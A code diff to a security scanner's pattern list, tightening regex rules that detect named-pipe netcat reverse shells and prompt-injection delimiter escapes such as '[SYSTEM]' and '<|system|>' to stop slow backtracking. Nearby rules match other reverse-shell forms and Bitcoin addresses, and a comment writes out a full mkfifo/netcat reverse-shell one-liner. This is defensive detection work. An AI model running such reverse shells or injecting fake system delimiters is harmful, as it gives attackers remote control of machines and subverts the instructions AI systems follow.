@@ -27,8 +27,13 @@ export const SECURITY_PATTERNS: PatternRule[] = [
   { id: 'RS-005', pattern: /\bsocket\.socket\s*\([^\n]{0,1000}?(?:\bos\.dup2\s*\(|\bpty\.spawn\s*\(|\bsubprocess\.\w+\s*\([^\n]{0,300}?\b(?:ba|z|k)?sh\b)|\bsocket\b[^\n]{0,1000}?\.on\s*\(\s*['"]data['"][^\n]{0,1000}?\b(?:exec|execSync|spawn|spawnSync)\s*\(/i, category: 'reverse-shell', severity: 'critical', description: 'Socket-based reverse shell' },
   { id: 'RS-006', pattern: /python\S*\s+-c\s+['"]import\s+socket/i, category: 'reverse-shell', severity: 'critical', description: 'Python reverse shell' },
   { id: 'RS-007', pattern: /\bsocat\b.*\bexec:/i, category: 'reverse-shell', severity: 'critical', description: 'Socat reverse shell' },
-  // `mkfifo f; cat f | sh -i 2>&1 | nc host port > f` — netcat without -e
-  { id: 'RS-008', pattern: /\bmkfifo\b.*\|\s*(?:\S*\/)?(?:ba|z|k)?sh\b.*\|\s*(?:nc|ncat|netcat)\b/i, category: 'reverse-shell', severity: 'critical', description: 'Named-pipe netcat reverse shell' },
+  // `mkfifo f; cat f | sh -i 2>&1 | nc host port > f` — netcat without -e.
+  // The first mkfifo and the first `| sh` after it are taken atomically
+  // (`(?=(…))\1`) from the start of a line: the earliest choices are always
+  // the best, and retrying every `|` against every later one was cubic
+  // (`mkfifo|e|e|…`, 100 KB: 15 s). A shell path stops at `|` (the later `|`
+  // starts the same match).
+  { id: 'RS-008', pattern: /(?<![^\n\r\u2028\u2029])(?=(.*?\bmkfifo\b))\1(?=(.*?\|\s*(?:[^\s|]*\/)?(?:ba|z|k)?sh\b))\2.*\|\s*(?:nc|ncat|netcat)\b/i, category: 'reverse-shell', severity: 'critical', description: 'Named-pipe netcat reverse shell' },
   // `exec 5<>/dev/tcp/host/port` — a read-write socket on a shell descriptor
   { id: 'RS-009', pattern: /\bexec\s+\d+<>\s*\/dev\/(?:tcp|udp)\//i, category: 'reverse-shell', severity: 'critical', description: 'Bash /dev/tcp socket descriptor' },
 
@@ -77,7 +82,10 @@ export const SECURITY_PATTERNS: PatternRule[] = [
   // word, or alone on its line. Not a subscript (`data['x'][system]`), a CLI
   // option value (`--assign-identity [system]`), a sentence noun (`in [system].`)
   // or a table-cell placeholder (`| [System] |`).
-  { id: 'PI-004', pattern: /(?<![\w'"\][-])(?<!--[\w-]+[ \t]+)\[(?:SYSTEM|ADMIN)\](?:[ \t]*:?[ \t]*(?=[A-Za-z])|[ \t]*:?[ \t]*$)|<\|system\|>/im, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — delimiter escape' },
+  // The lookbehinds follow the `[` (tried at every position they cost a scan
+  // back over each space run), and one space run before the optional ':'
+  // (`[ \t]*:?[ \t]*` split a long run every way: 80 KB, 18 s).
+  { id: 'PI-004', pattern: /\[(?<![\w'"\][-]\[)(?<!--[\w-]+[ \t]+\[)(?:SYSTEM|ADMIN)\][ \t]*(?::[ \t]*)?(?=[A-Za-z]|$)|<\|system\|>/im, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — delimiter escape' },
 
   // Crypto wallet targeting (from openclaw-security-monitor)
   { id: 'CW-001', pattern: /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/, category: 'crypto-wallet', severity: 'warning', description: 'Bitcoin address pattern' },
